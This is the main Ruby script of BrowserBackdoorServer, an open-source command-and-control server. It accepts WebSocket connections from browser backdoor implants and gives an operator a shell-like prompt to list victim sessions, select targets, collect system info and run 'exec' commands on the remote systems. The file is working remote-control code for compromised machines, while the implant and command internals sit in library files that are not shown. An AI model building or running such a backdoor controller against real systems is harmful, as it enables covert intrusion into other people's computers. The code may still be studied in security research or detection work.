#!/usr/bin/env ruby
# BrowserBackdoorServer - https://github.com/IMcPwn/browser-backdoor

# BrowserBackdoorServer (BBS) is a WebSocket server that listens for connections 
# from BrowserBackdoor and creates an command-line interface for 
# executing commands on the remote system(s).
# For more information visit: http://imcpwn.com

# MIT License

# Copyright (c) 2016 IMcPwn 

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

require_relative 'lib/bbs/printcolor'
require_relative 'lib/bbs/constants'
require_relative 'lib/bbs/commands'
require_relative 'lib/bbs/websocket'
require 'yaml'
require 'pry'
require 'readline'
require 'colorize'

def main()
    begin
        configfile = YAML.load_file("config.yml")
        wss = Bbs::WebSocket.new
        commands = Bbs::Constants.getCommands()
        infoCommands = Bbs::Constants.getInfoCommands()
        welcomeMessage = Bbs::Constants.getWelcomeMessage()

        # Begin WebSocket listener
        Thread.new{wss.startEM(configfile['host'], configfile['port'],
        configfile['secure'], configfile['priv_key'], configfile['cert_chain'])}

        setupAutocomplete(commands)
        printWelcome(welcomeMessage, configfile['host'], configfile['port'], configfile['secure'])

        # Start command line
        cmdLine(wss, commands, infoCommands)
    rescue => e
        puts e.backtrace
        Bbs::PrintColor.print_error("Quitting...")
        return
    end
end

def printWelcome(msg, host, port, secure)
    puts msg
    puts ("\nServer is listening on #{host}:#{port}" + ((secure == true) ? " securely" : "") + "...").colorize(:green)
    puts "By default, session -1 is selected which stands for all available sessions."
    puts "Enter help for command usage."
end

# Autocomplete is all of the "help" commands
def setupAutocomplete(commands)
    cmdAuto = proc { |s| commands.map{|cmd, _desc| cmd}.flatten.grep(/^#{Regexp.escape(s)}/) }
    Readline::completion_append_character = " "
    Readline::completion_proc = cmdAuto
end

def cmdLine(wss, commands, infoCommands)
    begin
        while cmdIn = Readline::readline("\nbbs > ".colorize(:cyan), true)
            case cmdIn.split()[0]
            when "help"
                Bbs::Command.helpCommand(commands)
            when "exit"
                break
            when "sessions"
                Bbs::Command.sessionsCommand(wss.getSelected(), wss.getWsList())
            when "target"
                Bbs::Command.targetCommand(wss, cmdIn.split())
            when "info"
                if Bbs::WebSocket.validSession?(wss.getSelected(), wss.getWsList())
                    Bbs::Command.infoCommand(infoCommands, wss.getSelected(), wss.getWsList())
                else
                    next
                end
            when "exec"
                if Bbs::WebSocket.validSession?(wss.getSelected(), wss.getWsList())
                    Bbs::Command.execCommand(wss.getSelected(), wss.getWsList(), cmdIn.split())
                else
                    next
                end
            when "get_cert"
                Bbs::Command.getCertCommand()
            when "pry"
                binding.pry
                setupAutocomplete(commands)
            when "clear"
                Bbs::Command.clearCommand()
            when nil
                next
            else
                Bbs::PrintColor.print_error("Invalid command. Try help for help.")
            end
        end
    rescue Interrupt
        Bbs::PrintColor.print_error("Caught interrupt (in the future use exit). Quitting...")
        return
    rescue => e
        Bbs::PrintColor.print_error(e.message)
        return
    end
end

main()
